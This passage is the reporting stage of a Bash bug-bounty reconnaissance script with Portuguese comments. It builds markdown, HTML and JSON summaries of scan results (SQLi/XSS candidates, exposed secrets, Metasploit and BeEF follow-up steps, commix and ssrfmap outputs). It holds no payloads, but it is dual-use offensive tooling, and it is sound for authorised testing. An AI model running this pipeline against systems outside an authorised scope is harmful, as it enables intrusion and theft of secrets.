- **Note**: SQLMap testing enabled with safety controls

### Other Vulnerabilities
- **LFI Candidates**: $LFI_CANDIDATES
- **SSRF Candidates**: $SSRF_CANDIDATES
- **RCE Candidates**: $(safe_count urls/gf_rce.txt)

### Misconfigurations
- **Nuclei Extended**: $NUCLEI_EXT_TOTAL findings  
- **Details**: See \`nuclei/nuclei_hosts_ext.txt\`

## 📊 Attack Surface Analysis

### Reconnaissance Results
- **Subdomains Discovered**: $SUBS_FOUND
- **Live Hosts**: $LIVE_HOSTS  
- **Total URLs**: $TOTAL_URLS
- **Parameterized URLs**: $PARAM_URLS
- **JavaScript Files**: $JS_FILES ($JS_DOWNLOADED downloaded)

### API Surface  
- **API Endpoints**: $API_ENDPOINTS
- **Details**: See \`apis/api_endpoints.txt\`

### Port Scanning
- **Open Ports**: $PORTS_FOUND
- **Hosts with Ports**: $HOSTS_WITH_PORTS

### Technology Stack
- **Details**: See \`alive/httpx_parsed.txt\` for full tech stack information

## 🔧 EXTRA TOOLS Results

### XSS Detection
- **kxss Results**: $KXSS_RESULTS findings
- **Reports**: \`reports/kxss/\`

### Endpoint & Link Discovery
- **linkfinder**: $LINKFINDER_ENDPOINTS endpoints extracted from JS
- **paramspider**: $PARAMSPIDER_PARAMS parameters found
- **Reports**: \`reports/linkfinder/\`, \`reports/paramspider/\`

### Burp Suite Scanner
- **Burp Suite Findings**: $BURP_VULNS vulnerabilities detected
- **Reports**: \`nuclei/burp_scan/\` (HTML reports and findings summary)

### Secret Scanning
- **secretfinder**: $SECRETFINDER_SECRETS secrets in JS files
- **gitleaks**: Check \`reports/gitleaks/report.json\`
- **trufflehog**: Check \`reports/trufflehog/\`
- **git-dumper**: Check \`reports/git_dumper/\` for exposed .git

### Visual Reconnaissance
- **gowitness**: $GOWITNESS_SCREENSHOTS screenshots captured
- **aquatone**: $AQUATONE_SCREENSHOTS screenshots + HTML report
- **Location**: \`screenshots/gowitness/\` and \`screenshots/aquatone/\`

### Cloud Assets
- **s3scanner**: $S3_BUCKETS S3 buckets found
- **cloud_enum**: Check \`reports/cloud_enum/results.txt\`

### Advanced Testing
- **commix**: Command injection testing in \`reports/commix/\`
- **lfisuite**: LFI testing in \`reports/lfisuite/\`
- **smuggler**: HTTP smuggling in \`reports/smuggler/\`
- **ssrfmap**: SSRF testing in \`reports/ssrfmap/\`

### Validation & Security Scanning Tools
- **Nikto**: $NIKTO_VULNS web server vulnerabilities found
- **Dirsearch**: $DIRSEARCH_PATHS interesting paths discovered
- **testssl.sh**: $TESTSSL_VULNS SSL/TLS vulnerabilities detected
- **XSpear**: $XSPEAR_XSS XSS vulnerabilities confirmed
- **Nmap NSE**: $NMAP_VULNS vulnerabilities via NSE scripts
- **WhatWeb**: $WHATWEB_TECHS technologies identified
- **Reports**: \`reports/nikto/\`, \`reports/dirsearch/\`, \`reports/testssl/\`, \`reports/xspear/\`, \`reports/nmap_vulns/\`, \`tech/whatweb/\`

### Exploitation & Validation Frameworks
- **BeEF**: $BEEF_GUIDES validation guides generated
  - ⚠️ Passive validation only - XSS confirmation tool
  - Guide: \`reports/beef/beef_validation_guide.txt\`
  - Hook JavaScript encontrado em XSS candidates
- **Metasploit**: Resource scripts prepared
  - ⚠️ Auxiliary scanners only - NO active exploits
  - Scripts: \`reports/metasploit/passive_validation.rc\`
  - SQLi validation: \`reports/metasploit/sqli_validation.rc\`
  - Results: \`reports/metasploit/msf_scan_results.txt\` ($MSF_RESULTS findings)

### 🔥 NOVAS MELHORIAS IMPLEMENTADAS
- **FFUF Parameter Fuzzing**: $FFUF_PARAMS parâmetros ocultos descobertos
  - Fuzzing agressivo de parâmetros em endpoints
  - Reports: \`reports/ffuf/discovered_params.txt\`
- **GraphQL Introspection**: $GRAPHQL_VULNS endpoints com introspection habilitada
  - Teste automático de /graphql, /graphiql, /api/graphql
  - Reports: \`reports/graphql/vulnerable_graphql.txt\`
- **CORS Misconfigurations**: $CORS_VULNS configurações vulneráveis
  - Teste de origens maliciosas e wildcard (*)
  - Reports: \`reports/cors/vulnerable.txt\`
- **CVSS Auto-Scoring**: Score calculado: **$CVSS_SCORE/100**
  - Análise de risco automática baseada em findings
  - Report detalhado: \`reports/cvss_score.txt\`

### 🎯 VALIDAÇÃO AUTOMÁTICA DE VULNERABILIDADES
- **SQLi Auto-Validados**: $SQLI_CONFIRMED confirmações (de $SQLI_VALIDATED candidatos)
  - Teste automático de erro SQL em candidates
  - Report: \`reports/validation/sqli_confirmed.txt\`
- **XSS Auto-Validados**: $XSS_CONFIRMED confirmações
  - Teste de XSS refletido em candidates
  - Report: \`reports/validation/xss_confirmed.txt\`
- **Secrets High Confidence**: $SECRETS_HIGH_CONF secrets validados
  - Regex aprimorado para AWS, GitHub, Stripe keys
  - Report: \`reports/validation/high_confidence_secrets.txt\`
- **CORS Confirmados**: $CORS_CONFIRMED vulnerabilidades verificadas
  - Dupla validação de misconfigurations
  - Report: \`reports/validation/cors_confirmed.txt\`

## 📁 Important Files
- **Live Hosts**: \`alive/httpx_results.txt\`
- **Parameterized URLs**: \`urls/with_params.txt\` 
- **Nuclei Results**: \`nuclei/nuclei_*_fast.txt\` (critical), \`nuclei/nuclei_*_ext.txt\` (extended)
- **XSS Results**: \`nuclei/dalfox_results.txt\`
- **Secrets**: \`secrets/\` directory
- **API Endpoints**: \`apis/api_endpoints.txt\`
- **GF Classification**: \`urls/gf_*.txt\`

## 🚀 Next Steps
1. **🔴 PRIORIDADE MÁXIMA - VALIDAÇÃO AUTOMÁTICA**:
   - SQLi confirmados: \`reports/validation/sqli_confirmed.txt\` ($SQLI_CONFIRMED vulnerabilidades)
   - XSS confirmados: \`reports/validation/xss_confirmed.txt\` ($XSS_CONFIRMED vulnerabilidades)
   - Secrets validados: \`reports/validation/high_confidence_secrets.txt\` ($SECRETS_HIGH_CONF itens)
   - CORS confirmados: \`reports/validation/cors_confirmed.txt\` ($CORS_CONFIRMED misconfigurations)
   - **CVSS Score**: \`reports/cvss_score.txt\` - Score geral: **$CVSS_SCORE/100**

2. **CRÍTICO**: Revisar vulnerabilidades encontradas por ferramentas:
   - SQLi (SQLMap): \`urls/sqli_validated.txt\` e \`poc/sqli/\`
   - XSS (XSpear): \`reports/xspear/xss_vulnerabilities.txt\`
   - Nmap NSE: \`reports/nmap_vulns/critical_vulns.txt\`
   - GraphQL: \`reports/graphql/vulnerable_graphql.txt\` ($GRAPHQL_VULNS endpoints)
   
3. **VALIDAÇÃO MANUAL**: Usar frameworks de exploração:
   - BeEF: Seguir guia em \`reports/beef/beef_validation_guide.txt\`
   - Metasploit: Executar \`msfconsole -r reports/metasploit/passive_validation.rc\`
   
4. **Alto Prioridade - Nuclei & SSL**: 
   - Nuclei findings críticos: \`nuclei/nuclei_*_fast.txt\`
   - SSL/TLS vulneráveis: \`reports/testssl/critical_ssl_issues.txt\`
   - Nikto vulnerabilities: \`reports/nikto/nikto_all_results.txt\`
   
5. **Média Prioridade - Secrets & Discovery**: 
   - Secrets expostos: \`secrets/\` directory
   - Paths interessantes: \`reports/dirsearch/interesting_paths.txt\`
   - Parâmetros descobertos (FFUF): \`reports/ffuf/discovered_params.txt\` ($FFUF_PARAMS parâmetros)
   
6. **Manual Testing - Candidates**: 
   - Candidatos adicionais: \`urls/gf_*.txt\`
   - Tecnologias vulneráveis: \`tech/whatweb/vulnerable_techs.txt\`
   - Candidatos adicionais: \`urls/gf_*.txt\`
   - Tecnologias vulneráveis: \`tech/whatweb/vulnerable_techs.txt\`
6. **Ongoing**: Monitor misconfigurations from extended Nuclei scan

## ⚙️ Configuration Used
- **Profile**: $PROFILE
- **Concurrency**: $CONCURRENCY threads
- **Rate Limit**: $RATE_LIMIT/s
- **Parallel Hosts**: $PARALLEL_HOSTS
- **Timeout**: $TIMEOUT_PER_HOST per host
- **Mode**: $([ "$DRY_RUN" = "true" ] && echo "DRY-RUN (safe collection only)" || echo "ACTIVE (full vulnerability scanning)")

## ⚠️ Methodology Notes
- Profile-based resource management for safe operation
- DRY-RUN mode enabled by default for safety
- Active scanning requires explicit --confirm flag
- SQLMap testing enabled with level=1, risk=1 safety controls
- All timeouts and rate limits configured per profile
- Scope validation and wildcard handling implemented
- Manual verification required before reporting findings

## 🔧 Tool Coverage
**Subdomain Enumeration**: subfinder, amass, findomain, chaos, crt.sh
**Live Detection**: httpx with tech detection, httprobe
**Port Scanning**: naabu$([ "$DRY_RUN" = "true" ] && echo " (skipped in dry-run)" || echo "")
**URL Collection**: gau, waybackurls, hakrawler, katana, gospider
**Vulnerability Scanning**: nuclei, dalfox, burp suite scanner$([ "$DRY_RUN" = "true" ] && echo " (skipped in dry-run)" || echo "")
**Classification**: gf patterns
**Secrets**: regex-based JS analysis, secretfinder, trufflehog, gitleaks
**XSS Detection**: kxss, dalfox
**Endpoint Discovery**: linkfinder, paramspider, arjun
**Exploitation**: commix, lfisuite, smuggler, ssrfmap
**Visual Recon**: gowitness, aquatone
**Cloud Assets**: s3scanner, cloud_enum
**Git Exposure**: git-dumper

---
**Report generated by enhanced reconnaissance pipeline with profile-based controls**
**Command used**: $0 $([ "$DRY_RUN" = "true" ] && echo "--dry-run" || echo "--confirm") --profile=$PROFILE $SCOPE_FILE
EOT

# Criar dashboard HTML melhorado
HTML=html/dashboard.html
mkdir -p "$(dirname "$HTML")"
cat > "$HTML" <<-HTMLDOC

<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>Enhanced Recon Dashboard</title>
  <style>
    body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;padding:20px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);margin:0}
    .container{max-width:1400px;margin:0 auto;background:white;padding:30px;border-radius:15px;box-shadow:0 8px 32px rgba(0,0,0,0.1)}
    .header{text-align:center;margin-bottom:30px;padding:20px;background:linear-gradient(135deg,#f093fb 0%,#f5576c 100%);border-radius:10px;color:white}
    .metric{display:inline-block;margin:10px;padding:20px;background:#f8f9fa;border-radius:12px;min-width:140px;text-align:center;border:2px solid transparent;transition:all 0.3s ease}
    .metric:hover{transform:translateY(-5px);box-shadow:0 5px 15px rgba(0,0,0,0.1)}
    .metric-value{font-size:28px;font-weight:bold;color:#2563eb}
    .metric-label{font-size:12px;color:#6b7280;margin-top:8px;font-weight:500}
    .critical{background:linear-gradient(135deg,#fef2f2,#fee2e2);border-color:#ef4444;color:#dc2626}
    .critical .metric-value{color:#dc2626}
    .warning{background:linear-gradient(135deg,#fefce8,#fef3c7);border-color:#f59e0b;color:#d97706}
    .warning .metric-value{color:#d97706}
    .success{background:linear-gradient(135deg,#f0fdf4,#dcfce7);border-color:#10b981;color:#059669}
    .success .metric-value{color:#059669}
    .profile-badge{display:inline-block;padding:8px 16px;background:#6366f1;color:white;border-radius:20px;font-size:14px;font-weight:bold;margin:10px}
    pre{background:#f4f4f4;padding:15px;border-radius:8px;overflow-x:auto;border-left:4px solid #6366f1}
    h1{color:#1f2937;margin-bottom:10px;font-size:2.5rem}
    h2{color:#374151;margin-top:40px;margin-bottom:20px;font-size:1.5rem;border-bottom:2px solid #e5e7eb;padding-bottom:10px}
    .status{text-align:center;padding:15px;border-radius:10px;margin:20px 0;font-weight:bold}
    .dry-run{background:#fef3c7;color:#92400e;border:2px solid #f59e0b}
    .active{background:#dcfce7;color:#166534;border:2px solid #10b981}
    .grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:20px;margin:20px 0}
    .card{background:white;padding:20px;border-radius:10px;box-shadow:0 2px 8px rgba(0,0,0,0.1);border-left:4px solid #6366f1}
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <h1>🎯 Enhanced Bug Bounty Dashboard</h1>
      <p><strong>Generated:</strong> $(date -u) | <strong>Target:</strong> $(basename "$SCOPE_FILE")</p>
      <span class="profile-badge">Profile: $PROFILE</span>
    </div>
    
    <div class="status $([ "$DRY_RUN" = "true" ] && echo "dry-run" || echo "active")">
      Mode: $([ "$DRY_RUN" = "true" ] && echo "🔍 DRY-RUN (Collection Only)" || echo "⚡ ACTIVE SCANNING")
    </div>
    
    <h2>📊 Attack Surface Overview</h2>
    <div class="metric">
      <div class="metric-value">$SUBS_FOUND</div>
      <div class="metric-label">Subdomains</div>
    </div>
    <div class="metric success">
      <div class="metric-value">$LIVE_HOSTS</div>
      <div class="metric-label">Live Hosts</div>
    </div>
    <div class="metric">
      <div class="metric-value">$TOTAL_URLS</div>
      <div class="metric-label">URLs Found</div>
    </div>
    <div class="metric warning">
      <div class="metric-value">$PARAM_URLS</div>
      <div class="metric-label">With Parameters</div>
    </div>
    <div class="metric">
      <div class="metric-value">$API_ENDPOINTS</div>
      <div class="metric-label">API Endpoints</div>
    </div>
    
    <h2>🔥 Critical Security Findings</h2>
    <div class="metric critical">
      <div class="metric-value">$NUCLEI_FAST_TOTAL</div>
      <div class="metric-label">Nuclei Critical</div>
    </div>
    <div class="metric critical">
      <div class="metric-value">$SQLI_VALIDATED</div>
      <div class="metric-label">SQLi Confirmed</div>
    </div>
    <div class="metric critical">
      <div class="metric-value">$DALFOX_RESULTS</div>
      <div class="metric-label">XSS Confirmed</div>
    </div>
    <div class="metric warning">
      <div class="metric-value">$TOTAL_SECRETS</div>
      <div class="metric-label">Secrets Exposed</div>
    </div>
    
    <h2>⚡ Vulnerability Candidates</h2>
    <div class="metric warning">
      <div class="metric-value">$XSS_CANDIDATES</div>
      <div class="metric-label">XSS Candidates</div>
    </div>
    <div class="metric warning">
      <div class="metric-value">$SQLI_CANDIDATES</div>
      <div class="metric-label">SQLi Candidates</div>
    </div>
    <div class="metric">
      <div class="metric-value">$LFI_CANDIDATES</div>
      <div class="metric-label">LFI Candidates</div>
    </div>
    <div class="metric">
      <div class="metric-value">$SSRF_CANDIDATES</div>
      <div class="metric-label">SSRF Candidates</div>
    </div>
    
    <div class="grid">
      <div class="card">
        <h3>🔧 Profile Configuration</h3>
        <ul>
          <li>Concurrency: $CONCURRENCY threads</li>
          <li>Rate Limit: $RATE_LIMIT/s</li>
          <li>Parallel Hosts: $PARALLEL_HOSTS</li>
          <li>Timeout: $TIMEOUT_PER_HOST</li>
          <li>CPUs: $NCPU</li>
        </ul>
      </div>
      
      <div class="card">
        <h3>📈 Success Rates</h3>
        <ul>
          <li>Subdomain Expansion: $(echo "scale=1; $SUBS_FOUND / $TOTAL_DOMAINS" | bc 2>/dev/null || echo "N/A")x</li>
          <li>Live Host Rate: $(echo "scale=1; $LIVE_HOSTS * 100 / $SUBS_FOUND" | bc 2>/dev/null || echo "N/A")%</li>
          <li>Parameterized URLs: $(echo "scale=1; $PARAM_URLS * 100 / $TOTAL_URLS" | bc 2>/dev/null || echo "N/A")%</li>
        </ul>
      </div>
    </div>
    
    <h2>🔍 Latest Critical Findings</h2>
    <pre>$(head -n 20 nuclei/nuclei_*_fast.txt nuclei/dalfox_results.txt 2>/dev/null || echo "No critical findings in this scan")</pre>
    
    <h2>🔗 Quick Navigation</h2>
    <div class="grid">
      <div class="card">
        <h3>📋 Reports</h3>
        <ul>
          <li><a href="../reports/report.md">📋 Full Report</a></li>
          <li><a href="../reports/vuln_summary.txt">⚡ Quick Summary</a></li>
        </ul>
      </div>
      
      <div class="card">
        <h3>🔥 Vulnerabilities</h3>
        <ul>
          <li><a href="../nuclei/">🎯 Nuclei Results</a></li>
          <li><a href="../secrets/">🔑 Secrets Directory</a></li>
          <li><a href="../urls/sqli_validated.txt">💉 SQLi Confirmed</a></li>
          <li><a href="../urls/gf_xss.txt">❌ XSS Candidates</a></li>
          <li><a href="../urls/gf_sqli.txt">💉 SQLi Candidates</a></li>
          <li><a href="../poc/sqli/">📁 SQLi PoCs</a></li>
        </ul>
      </div>
      
      <div class="card">
        <h3>📊 Data Files</h3>
        <ul>
          <li><a href="../alive/hosts.txt">✅ Live Hosts</a></li>
          <li><a href="../urls/with_params.txt">🎯 Parameterized URLs</a></li>
          <li><a href="../apis/api_endpoints.txt">🔌 API Endpoints</a></li>
          <li><a href="../js/downloads/">📜 JS Files</a></li>
        </ul>
      </div>
    </div>
    
    <div style="text-align:center;margin-top:40px;padding:20px;background:#f8f9fa;border-radius:10px">
      <p><strong>Enhanced Bug Bounty Scanner v2.0</strong></p>
      <p>Profile-based • Safety-first • Comprehensive coverage</p>
    </div>
  </div>
</body>
</html>
HTMLDOC

# ============= EXPORT JSON (OPCIONAL) =============
if [[ "$EXPORT_JSON" = "true" ]]; then
    log_info "Exportando resultados em JSON..."
    
    cat > reports/results.json <<-JSONEOF
{
  "scan_info": {
    "timestamp": "$(date -u -Iseconds)",
    "target_scope": "$(basename "$SCOPE_FILE")",
    "profile": "$PROFILE", 
    "mode": "$([ "$DRY_RUN" = "true" ] && echo "dry-run" || echo "active")",
    "configuration": {
      "concurrency": $CONCURRENCY,
      "rate_limit": $RATE_LIMIT,
      "parallel_hosts": $PARALLEL_HOSTS,
      "timeout_per_host": "$TIMEOUT_PER_HOST"
    }
  },
  "statistics": {
    "total_domains": $TOTAL_DOMAINS,
    "subdomains_found": $SUBS_FOUND,
    "live_hosts": $LIVE_HOSTS,
    "total_urls": $TOTAL_URLS,
    "parameterized_urls": $PARAM_URLS,
    "js_files": $JS_FILES,
    "api_endpoints": $API_ENDPOINTS,
    "ports_found": $PORTS_FOUND
  },
  "vulnerabilities": {
    "nuclei_critical": $NUCLEI_FAST_TOTAL,
    "nuclei_medium": $NUCLEI_EXT_TOTAL,
    "xss_confirmed": $DALFOX_RESULTS,
    "sqli_confirmed": $SQLI_VALIDATED,
    "secrets_exposed": $TOTAL_SECRETS,
    "candidates": {
      "xss": $XSS_CANDIDATES,
      "sqli": $SQLI_CANDIDATES,
      "lfi": $LFI_CANDIDATES,
      "ssrf": $SSRF_CANDIDATES
    }
  },
  "extra_tools": {
    "xss_detection": {
      "kxss_results": $KXSS_RESULTS
    },
    "endpoint_discovery": {
      "linkfinder_endpoints": $LINKFINDER_ENDPOINTS,
      "paramspider_params": $PARAMSPIDER_PARAMS
    },
    "secret_scanning": {
      "secretfinder_secrets": $SECRETFINDER_SECRETS
    },
    "visual_recon": {
      "gowitness_screenshots": $GOWITNESS_SCREENSHOTS,
      "aquatone_screenshots": $AQUATONE_SCREENSHOTS
    },
    "cloud_assets": {
      "s3_buckets_found": $S3_BUCKETS
    },
    "burp_suite": {
      "vulnerabilities_found": $BURP_VULNS
    }
  },
  "files": {
    "live_hosts": "alive/hosts.txt",
    "parameterized_urls": "urls/with_params.txt",
    "nuclei_results": "nuclei/",
    "secrets": "secrets/",
    "reports": "reports/"
  }
}
JSONEOF
fi

# ============= RELATÓRIO FINAL COM NOTIFICAÇÕES =============
final_report() {
    log_info "Enviando relatório final..."
    
    # Determinar nível de alerta
    if [[ "$NUCLEI_FAST_TOTAL" -gt 5 ]] || [[ "$DALFOX_RESULTS" -gt 0 ]] || [[ "$SQLI_VALIDATED" -gt 0 ]] || [[ "$TOTAL_SECRETS" -gt 10 ]]; then
        ALERT="🔴 *HIGH RISK*"
    elif [[ "$NUCLEI_FAST_TOTAL" -gt 0 ]] || [[ "$TOTAL_SECRETS" -gt 0 ]]; then
        ALERT="🟡 *MEDIUM RISK*"  
    else
        ALERT="🟢 *LOW RISK*"
    fi
    
    FINAL_SUMMARY="$ALERT  
🎯 *Enhanced Bug Bounty Scan COMPLETE* ✅
📂 \`$(pwd | sed 's/.*\///')\`  
⏱️ Finalizado: \`$(date '+%H:%M:%S')\`
🔧 Perfil: \`$PROFILE\` | Modo: \`$([ "$DRY_RUN" = "true" ] && echo "DRY-RUN" || echo "ATIVO")\`

*📊 Attack Surface:*  
- 🌐 Subdomains: $SUBS_FOUND  
- 🟢 Live hosts: $LIVE_HOSTS  
- 🔗 URLs: $TOTAL_URLS ($PARAM_URLS com parâmetros)  
- 🚪 Portas: $PORTS_FOUND abertas
- 🔌 APIs: $API_ENDPOINTS endpoints

*🔥 Critical Findings:*  
- ⚡ Nuclei crítico: $NUCLEI_FAST_TOTAL  
- 💉 SQLi confirmada: $SQLI_VALIDATED
- ❌ XSS confirmado: $DALFOX_RESULTS
- 🔑 Secrets expostos: $TOTAL_SECRETS

*⚡ Vulnerability Candidates:*  
- ❌ XSS candidatos: $XSS_CANDIDATES  
- 💉 SQLi candidatos: $SQLI_CANDIDATES
- 📁 LFI candidatos: $LFI_CANDIDATES
- 🌐 SSRF candidatos: $SSRF_CANDIDATES
- 🔍 Médio risco: $NUCLEI_EXT_TOTAL

*🔧 Validation Tools Results:*
- 🔥 Nikto vulns: $NIKTO_VULNS
- 🔐 SSL/TLS issues: $TESTSSL_VULNS
- ⚡ XSpear XSS: $XSPEAR_XSS
- 🎯 Nmap NSE vulns: $NMAP_VULNS
- 🔍 Directory paths: $DIRSEARCH_PATHS
- 🥩 BeEF guides: $BEEF_GUIDES
- 🎯 Metasploit: Scripts prontos

*🎯 Next Steps:*
- Review critical Nuclei findings
- Validate XSS with BeEF (reports/beef/)
- Run Metasploit scripts (reports/metasploit/)
- Check SSL vulnerabilities (reports/testssl/)
- Review Nmap NSE findings (reports/nmap_vulns/)
$([ "$DRY_RUN" = "true" ] && echo "- Re-run with --confirm for active scanning" || echo "")
"
    
    send_notification "$FINAL_SUMMARY" "false"
}

final_report

# ============= SAÍDA FINAL COLORIDA =============
echo ""
echo "============================================================"
echo "🎯 ENHANCED BUG BOUNTY SCAN COMPLETE"
echo "============================================================"
echo "📁 Resultados salvos em: $(pwd)"
echo "🔧 Perfil usado: $PROFILE"
echo "⚙️  Modo: $([ "$DRY_RUN" = "true" ] && echo "DRY-RUN (apenas coleta)" || echo "ATIVO (scanning completo)")"
echo ""
echo "📊 RESUMO EXECUTIVO:"
echo "   🌐 Subdomínios: $SUBS_FOUND"
echo "   ✅ Hosts vivos: $LIVE_HOSTS"
echo "   🔗 URLs coletadas: $TOTAL_URLS ($PARAM_URLS com parâmetros)"
echo "   🔌 APIs encontradas: $API_ENDPOINTS"
echo ""
echo "🔥 VULNERABILIDADES:"
echo "   ⚡ Nuclei crítico: $NUCLEI_FAST_TOTAL"
echo "   💉 SQLi confirmada: $SQLI_VALIDATED"
echo "   ❌ XSS confirmado: $DALFOX_RESULTS"
echo "   🔑 Secrets expostos: $TOTAL_SECRETS"
echo ""
echo "🔧 FERRAMENTAS DE VALIDAÇÃO:"
echo "   🔥 Nikto vulnerabilidades: $NIKTO_VULNS"
echo "   🔐 SSL/TLS issues: $TESTSSL_VULNS"
echo "   ⚡ XSpear XSS: $XSPEAR_XSS"
echo "   🎯 Nmap NSE vulns: $NMAP_VULNS"
echo "   🔍 Paths interessantes: $DIRSEARCH_PATHS"
echo "   🥩 BeEF validation guides: $BEEF_GUIDES"
echo "   🎯 Metasploit scripts: Prontos"
echo ""
echo "📋 RELATÓRIOS:"
echo "   📄 Relatório completo: reports/report.md"  
echo "   🌐 Dashboard HTML: html/dashboard.html"
echo "   📊 Resumo rápido: reports/vuln_summary.txt"
if [[ "$EXPORT_JSON" = "true" ]]; then
echo "   📋 Export JSON: reports/results.json"
fi
echo ""
echo "🚀 PRÓXIMOS PASSOS:"
echo "   1. Revisar findings críticos do Nuclei"
if [[ "$DALFOX_RESULTS" -gt 0 ]]; then
echo "   2. ⚠️  VALIDAR XSS confirmados pelo Dalfox"
fi
if [[ "$TOTAL_SECRETS" -gt 0 ]]; then
echo "   3. 🔍 VERIFICAR secrets expostos em secrets/"
fi
if [[ "${BEEF_GUIDES:-0}" -gt 0 ]]; then
echo "   4. 🥩 VALIDAR XSS com BeEF: reports/beef/beef_validation_guide.txt"
fi
if [[ -f "reports/metasploit/passive_validation.rc" ]]; then
echo "   5. 🎯 EXECUTAR Metasploit: msfconsole -r reports/metasploit/passive_validation.rc"
fi
if [[ "${TESTSSL_VULNS:-0}" -gt 0 ]]; then
echo "   6. 🔐 REVISAR SSL/TLS issues: reports/testssl/critical_ssl_issues.txt"
fi
if [[ "${NMAP_VULNS:-0}" -gt 0 ]]; then
echo "   7. 🎯 ANALISAR Nmap NSE: reports/nmap_vulns/critical_vulns.txt"
fi
if [[ "$DRY_RUN" = "true" ]]; then
echo "   8. Re-executar com --confirm para scanning ativo"
fi
echo "   9. Teste manual de candidatos SQLi/LFI/SSRF"
echo ""
echo "⚠️  LEMBRETE: Validação manual necessária antes de reportar"
echo "============================================================"

# Log final
log_info "Scan completo. Profile: $PROFILE, Mode: $([ "$DRY_RUN" = "true" ] && echo "DRY-RUN" || echo "ACTIVE")"
log_info "Total runtime: $(date -d@$(($(date +%s) - $(stat -c %Y logs/scanner.log 2>/dev/null || date +%s))) -u +%H:%M:%S 2>/dev/null || echo "N/A")"

# Salvar configuração usada para referência futura
cat > logs/scan_config.txt <<-CONFIGEOF
SCAN CONFIGURATION - $(date -u)
==============================
Profile: $PROFILE
Mode: $([ "$DRY_RUN" = "true" ] && echo "DRY-RUN" || echo "ACTIVE")
Concurrency: $CONCURRENCY
Rate Limit: $RATE_LIMIT/s
Parallel Hosts: $PARALLEL_HOSTS
Timeout per Host: $TIMEOUT_PER_HOST
CPUs Used: $NCPU
Max Crawl Depth: $MAX_CRAWL_DEPTH

Command: $0 $*

Results Directory: $(pwd)
CONFIGEOF

exit 0